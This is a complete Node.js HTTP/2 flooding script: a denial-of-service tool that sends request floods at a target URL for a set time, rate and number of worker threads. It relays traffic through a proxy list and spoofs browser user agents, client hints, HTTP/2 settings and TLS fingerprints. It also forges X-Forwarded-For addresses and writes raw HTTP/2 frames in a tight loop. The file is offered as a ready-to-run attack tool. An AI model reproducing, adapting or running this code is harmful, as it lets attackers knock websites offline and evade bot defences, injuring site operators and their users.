const net = require('net'),
      http2 = require('http2'),
      tls = require('tls'),
      cluster = require('cluster'),
      url = require('url'),
      crypto = require('crypto'),
      fakeua = require('fake-useragent'),
      fs = require('fs'),
      HPACK = require('hpack');

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

process.on('uncaughtException', function (error) {});
process.on('unhandledRejection', function (error) {});

if (process.argv.length < 7) {
    console.log('Usage: node target time rate thread proxyfile');
    process.exit();
}

const headers = {};

function readProxyFile(filePath) {
    return fs.readFileSync(filePath, 'utf-8').toString().split(/\r?\n/);
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function selectRandomElement(array) {
    return array[getRandomInt(0, array.length)];
}

function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    const charLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charLength));
    }
    return result;
}

function generateRandomStringRange(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

function generateIpSpoof() {
    const getRandomByte = () => Math.floor(Math.random() * 255);
    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
}
const spoofedIp = generateIpSpoof();

function generateRandomNumberString() {
    const getRandomNumber = () => Math.floor(Math.random() * 9999999999);
    return '' + getRandomNumber();
}
const spoofedNumber = generateRandomNumberString();

function generateLargeRandomNumber() {
    const getLargeRandom = () => Math.floor(Math.random() * 5009000000000);
    return '' + getLargeRandom();
}
const spoofedLargeNumber = generateLargeRandomNumber();

const args = {
    'target': process.argv[2],
    'time': parseInt(process.argv[3]),
    'Rate': parseInt(process.argv[4]),
    'threads': parseInt(process.argv[5]),
    'proxyFile': process.argv[6]
};

const sig = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
];
const sigalgs = sig.join(':');

const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384"
  ];
const cipher = cplist[Math.floor(Math.random() * cplist.length)];

const accept_header = [
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
];

const lang_header = [
    'ko-KR',
    'en-US',
    'zh-CN',
    'zh-TW',
    'ja-JP',
    'en-GB',
    'en-AU',
    'en-GB,en-US;q=0.9,en;q=0.8',
    'en-GB,en;q=0.5',
    'en-CA',
    'en-UK, en, de;q=0.5',
    'en-NZ',
    'en-GB,en;q=0.6',
    'en-ZA',
    'en-IN',
    'en-PH',
    'en-SG',
    'en-HK'
];

const encoding_header = [
    'gzip, deflate, br',
    'deflate',
    'gzip, deflate, lzma, sdch',
    'gzip, deflate, br, zstd'
];

const control_header = [
    'no-cache',
    'max-age=0',
    'max-age=3600'
];

const refers = [
    'http://anonymouse.org/cgi-bin/anon-www.cgi/',
    'http://careers.gatesfoundation.org/search?q=',
    'http://coccoc.com/search#query=',
    'http://engadget.search.aol.com/search?q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=',
    'http://help.baidu.com/searchResult?keywords=',
    'http://www.google.com/?q=',
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://duckduckgo.com/'
];

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
const ciphers = 'GREASE:' + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(':');

const uap = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9'
];

const version = [
    '"Chromium";v="100", "Google Chrome";v="100"',
    '"Not_A Brand";v="99", "Google Chrome";v="86", "Chromium";v="86"'
];

const platform = ['Linux', 'macOS', 'Windows'];
const site = ['cross-site', 'same-origin', 'same-site', 'none'];
const mode = ['cors', 'navigate', 'no-cors', 'same-origin'];
const dest = ['document', 'image', 'embed', 'empty', 'frame'];

const rateHeaders = [
    { 'akamai-origin-hop': generateRandomString(5) },
    { 'source-ip': generateRandomString(5) },
    { 'via': generateRandomString(5) },
    { 'cluster-ip': generateRandomString(5) }
];

const useragentList = [
    '(CheckSecurity 2_0)',
    '(BraveBrowser 5_0)',
    '(ChromeBrowser 3_0)',
    '(ChromiumBrowser 4_0)'
];

const mozilla = [
    'Mozilla/5.0 ',
    'Mozilla/6.0 ',
    'Mozilla/7.0 '
];

const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", "duckduckgo"];

function getRandomBrowser() {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function transformSettings(settings) {
    const settingsMap = {
        "SETTINGS_HEADER_TABLE_SIZE": 0x1,
        "SETTINGS_ENABLE_PUSH": 0x2,
        "SETTINGS_MAX_CONCURRENT_STREAMS": 0x3,
        "SETTINGS_INITIAL_WINDOW_SIZE": 0x4,
        "SETTINGS_MAX_FRAME_SIZE": 0x5,
        "SETTINGS_MAX_HEADER_LIST_SIZE": 0x6
    };
    return settings.map(([key, value]) => [settingsMap[key], value]);
}

function h2Settings(browser) {
    const settings = {
        brave: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        chrome: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        firefox: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        mobile: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        opera: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        operagx: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        safari: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        duckduckgo: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ]
    };
    return Object.fromEntries(settings[browser]);
}

function generateHeaders(browser) {
    const versions = {
        chrome: { min: 115, max: 125 },
        safari: { min: 14, max: 17 },
        brave: { min: 115, max: 125 },
        firefox: { min: 100, max: 115 },
        mobile: { min: 95, max: 115 },
        opera: { min: 85, max: 105 },
        operagx: { min: 85, max: 105 },
        duckduckgo: { min: 12, max: 17 }
    };

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    const fullVersions = {
        brave: `${version}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
        chrome: `${version}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
        firefox: `${version}.0`,
        safari: `${version}.${Math.floor(Math.random() * 2)}`,
        mobile: `${version}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
        opera: `${version}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
        operagx: `${version}.0.${Math.floor(4000 + Math.random() * 1000)}.${Math.floor(100 + Math.random() * 200)}`,
        duckduckgo: `7.${Math.floor(Math.random() * 10)}`
    };

    const platforms = {
        chrome: Math.random() < 0.5 ? "Win64" : "Win32",
        safari: Math.random() < 0.5 ? "macOS" : "iOS",
        brave: Math.random() < 0.5 ? "Linux" : "Win64",
        firefox: Math.random() < 0.5 ? "Linux" : "Win64",
        mobile: Math.random() < 0.5 ? "Android" : "iOS",
        opera: Math.random() < 0.5 ? "Linux" : "Win64",
        operagx: Math.random() < 0.5 ? "Linux" : "Win64",
        duckduckgo: Math.random() < 0.5 ? "macOS" : "Windows"
    };
    const platformType = platforms[browser];

    const userAgents = {
        chrome: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; ${platformType}; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersions.chrome} Safari/537.36`,
        firefox: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; ${platformType}; x64; rv:${fullVersions.firefox}) Gecko/20100101 Firefox/${fullVersions.firefox}`,
        safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(13 + Math.random() * 4)}_${Math.floor(Math.random() * 4)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${fullVersions.safari} Safari/605.1.15`,
        opera: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; ${platformType}; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersions.opera} Safari/537.36 OPR/${fullVersions.opera}`,
        operagx: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; ${platformType}; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersions.operagx} Safari/537.36 OPR/${fullVersions.operagx} (Edition GX)`,
        brave: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; ${platformType}; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersions.brave} Safari/537.36 Brave/${fullVersions.brave}`,
        mobile: `Mozilla/5.0 (Linux; Android ${Math.floor(11 + Math.random() * 4)}; ${platformType}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersions.mobile} Mobile Safari/537.36`,
        duckduckgo: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(13 + Math.random() * 4)}_${Math.floor(Math.random() * 4)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${fullVersions.duckduckgo} DuckDuckGo/7 Safari/605.1.15`
    };

    const headersMap = {
        brave: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomStringRange(3, 10) + "=" + generateRandomStringRange(5, 15),
            "sec-ch-ua": `"Brave";v="${fullVersions.brave}", "Chromium";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": `"${platformType}"`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5",
            "user-agent": userAgents.brave,
            "accept-language": Math.random() < 0.6 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate",
            "referer": Math.random() < 0.6 ? "https://www.google.com/" : Math.random() < 0.3 ? "https://brave.com/" : `https://${parsedTarget.host}/`,
            "x-forwarded-for": spoofedIp,
            "sec-fetch-dest": Math.random() < 0.7 ? "document" : "empty",
            "sec-fetch-mode": Math.random() < 0.7 ? "navigate" : "cors",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache",
            "pragma": "no-cache",
            "te": "trailers"
        },
        chrome: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomStringRange(3, 10) + "=" + generateRandomStringRange(5, 15),
            "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${fullVersions.chrome}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": `"${platformType}"`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5",
            "user-agent": userAgents.chrome,
            "accept-language": Math.random() < 0.6 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate",
            "referer": Math.random() < 0.6 ? "https://www.google.com/" : Math.random() < 0.3 ? "https://www.youtube.com/" : `https://${parsedTarget.host}/`,
            "x-forwarded-for": spoofedIp,
            "sec-fetch-dest": Math.random() < 0.7 ? "document" : "empty",
            "sec-fetch-mode": Math.random() < 0.7 ? "navigate" : "cors",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache",
            "pragma": "no-cache",
            "te": "trailers"
        },
        firefox: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomStringRange(3, 10) + "=" + generateRandomStringRange(5, 15),
            "sec-ch-ua": `"Mozilla Firefox";v="${fullVersions.firefox}", "Gecko";v="20100101", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.6 ? "?0" : "?1",
            "sec-ch-ua-platform": `"${platformType}"`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "user-agent": userAgents.firefox,
            "accept-language": Math.random() < 0.6 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate",
            "referer": Math.random() < 0.6 ? "https://www.google.com/" : Math.random() < 0.3 ? "https://www.mozilla.org/" : `https://${parsedTarget.host}/`,
            "x-forwarded-for": spoofedIp,
            "sec-fetch-dest": Math.random() < 0.7 ? "document" : "empty",
            "sec-fetch-mode": Math.random() < 0.7 ? "navigate" : "cors",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache",
            "pragma": "no-cache",
            "te": "trailers"
        },
        safari: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomStringRange(3, 10) + "=" + generateRandomStringRange(5, 15),
            "sec-ch-ua": `"Safari";v="${fullVersions.safari}", "AppleWebKit";v="${Math.floor(537 + Math.random() * 20)}"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": `"${platformType}"`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5",
            "user-agent": userAgents.safari,
            "accept-language": Math.random() < 0.6 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate",
            "referer": Math.random() < 0.6 ? "https://www.google.com/" : Math.random() < 0.3 ? "https://www.apple.com/" : `https://${parsedTarget.host}/`,
            "x-forwarded-for": spoofedIp,
            "sec-fetch-dest": Math.random() < 0.7 ? "document" : "empty",
            "sec-fetch-mode": Math.random() < 0.7 ? "navigate" : "cors",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache",
            "pragma": "no-cache",
            "te": "trailers"
        },
        mobile: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomStringRange(3, 10) + "=" + generateRandomStringRange(5, 15),
            "sec-ch-ua": `"Google Chrome";v="${fullVersions.mobile}", "Chromium";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": `"${platformType}"`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "user-agent": userAgents.mobile,
            "accept-language": Math.random() < 0.6 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate",
            "referer": Math.random() < 0.6 ? "https://www.google.com/" : Math.random() < 0.3 ? "https://m.facebook.com/" : `https://${parsedTarget.host}/`,
            "x-forwarded-for": spoofedIp,
            "sec-fetch-dest": Math.random() < 0.7 ? "document" : "empty",
            "sec-fetch-mode": Math.random() < 0.7 ? "navigate" : "cors",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache",
            "pragma": "no-cache",
            "te": "trailers"
        },
        opera: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomStringRange(3, 10) + "=" + generateRandomStringRange(5, 15),
            "sec-ch-ua": `"Opera";v="${fullVersions.opera}", "Chromium";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.6 ? "?1" : "?0",
            "sec-ch-ua-platform": `"${platformType}"`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "user-agent": userAgents.opera,
            "accept-language": Math.random() < 0.6 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate",
            "referer": Math.random() < 0.6 ? "https://www.google.com/" : Math.random() < 0.3 ? "https://www.opera.com/" : `https://${parsedTarget.host}/`,
            "x-forwarded-for": spoofedIp,
            "sec-fetch-dest": Math.random() < 0.7 ? "document" : "empty",
            "sec-fetch-mode": Math.random() < 0.7 ? "navigate" : "cors",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache",
            "pragma": "no-cache",
            "te": "trailers"
        },
        operagx: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomStringRange(3, 10) + "=" + generateRandomStringRange(5, 15),
            "sec-ch-ua": `"Opera GX";v="${fullVersions.operagx}", "Chromium";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": `"${platformType}"`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "user-agent": userAgents.operagx,
            "accept-language": Math.random() < 0.6 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate",
            "referer": Math.random() < 0.6 ? "https://www.google.com/" : Math.random() < 0.3 ? "https://www.opera.com/gx" : `https://${parsedTarget.host}/`,
            "x-forwarded-for": spoofedIp,
            "sec-fetch-dest": Math.random() < 0.7 ? "document" : "empty",
            "sec-fetch-mode": Math.random() < 0.7 ? "navigate" : "cors",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache",
            "pragma": "no-cache",
            "te": "trailers"
        },
        duckduckgo: {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomStringRange(3, 10) + "=" + generateRandomStringRange(5, 15),
            "sec-ch-ua": `"DuckDuckGo";v="${fullVersions.duckduckgo}", "Chromium";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": `"${platformType}"`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "user-agent": userAgents.duckduckgo,
            "accept-language": Math.random() < 0.6 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate",
            "referer": Math.random() < 0.6 ? "https://www.google.com/" : Math.random() < 0.3 ? "https://duckduckgo.com/" : `https://${parsedTarget.host}/`,
            "x-forwarded-for": spoofedIp,
            "sec-fetch-dest": Math.random() < 0.7 ? "document" : "empty",
            "sec-fetch-mode": Math.random() < 0.7 ? "navigate" : "cors",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache",
            "pragma": "no-cache",
            "te": "trailers"
        }
    };
    return headersMap[browser];
}

const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(startFlood, 1);
}

class NetSocket {
    constructor() {}

    HTTP(proxyConfig, callback) {
        const [proxyHost, proxyPort] = proxyConfig.address.split(':');
        const connectRequest = `CONNECT ${proxyConfig.address}:443 HTTP/1.1\r\nHost: ${proxyConfig.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const connectBuffer = new Buffer.from(connectRequest);
        const socket = net.connect({
            host: proxyConfig.host,
            port: proxyConfig.port
        });

        socket.setTimeout(proxyConfig.timeout * 100000);
        socket.setKeepAlive(true, 100000);

        socket.on('connect', () => {
            socket.write(connectBuffer);
        });

        socket.on('data', data => {
            const response = data.toString('utf-8');
            const isValidResponse = response.includes('HTTP/1.1 200');
            if (!isValidResponse) {
                socket.destroy();
                return callback(undefined, 'error: invalid response from proxy server');
            }
            return callback(socket, undefined);
        });

        socket.on('timeout', () => {
            socket.destroy();
            return callback(undefined, 'error: timeout exceeded');
        });

        socket.on('error', error => {
            socket.destroy();
            return callback(undefined, 'error: ' + error);
        });
    }
}

const Socket = new NetSocket();

function startFlood() {
    const proxy = selectRandomElement(readProxyFile(args.proxyFile));
    const [proxyHost, proxyPort] = proxy.split(':');
    const browser = getRandomBrowser();
    const h2settings = h2Settings(browser);
    const h2_config = transformSettings(Object.entries(h2settings));
    const dynamicHeaders = generateHeaders(browser);

    const proxyConfig = {
        host: proxyHost,
        port: ~~proxyPort,
        address: parsedTarget.host + ':443',
        timeout: 300
    };

    Socket.HTTP(proxyConfig, (socket, error) => {
        if (error) return;

        socket.setKeepAlive(true, 200000);

        const tlsConfig = {
            secure: true,
            ALPNProtocols: ['h2', 'http/1.1', 'spdy/3.1'],
            sigals: sigalgs,
            socket: socket,
            ciphers: cipher,
            ecdhCurve: 'prime256v1:X25519',
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: 'TLS_method'
        };

        const tlsConnection = tls.connect(443, parsedTarget.host, tlsConfig);
        tlsConnection.setKeepAlive(true, 60000);

        let hpack = new HPACK();
        const http2Client = http2.connect(parsedTarget.href, {
            protocol: 'https:',
            settings: h2settings,
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConnection,
            socket: socket
        });

        http2Client.setMaxListeners(0);

        const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
        const updateWindow = Buffer.alloc(4);
        updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
        const frames = [
            Buffer.from(PREFACE, 'binary'),
            encodeFrame(0, 4, encodeSettings([...h2_config])),
            encodeFrame(0, 8, updateWindow)
        ];

        http2Client.on('remoteSettings', (settings) => {
            const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
            http2Client.setLocalWindowSize(localWindowSize, 0);
        });

        http2Client.on('connect', () => {
            const intervalId = setInterval(() => {
                const shuffleObject = (obj) => {
                    const keys = Object.keys(obj);
                    for (let i = keys.length - 1; i > 0; i--) {
                        const j = Math.floor(Math.random() * (i + 1));
                        [keys[i], keys[j]] = [keys[j], keys[i]];
                    }
                    const shuffledObj = {};
                    keys.forEach(key => shuffledObj[key] = obj[key]);
                    return shuffledObj;
                };

                const requestHeaders = shuffleObject({
                    ...dynamicHeaders,
                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
                    ...(Math.random() < 0.5 ? { "Cache-Control": "max-age=0" } : {}),
                    ...(Math.random() < 0.5 ? { ["MOMENT" + generateRandomString(4)]: "POLOM" + generateRandomStringRange(1, 5) } : { ["X-FRAMES" + generateRandomStringRange(1, 4)]: "NAVIGATE" + generateRandomString(3) })
                });

                const packed = Buffer.concat([
                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                    hpack.encode(requestHeaders)
                ]);

                for (let i = 0; i < args.Rate; i++) {
                    const streamId = 1;
                    const request = http2Client.request(requestHeaders);
                    http2Client.write(encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20));
                    request.on('response', response => {
                        request.close();
                        request.destroy();
                    });
                    request.end();
                }
                http2Client.write(Buffer.concat(frames));
            }, 1000);
        });

        http2Client.on('close', () => {
            http2Client.destroy();
            socket.destroy();
        });

        http2Client.on('error', () => {
            http2Client.destroy();
            socket.destroy();
        });
    });
}

const stopScript = () => process.exit(1);
setTimeout(stopScript, args.time * 1000);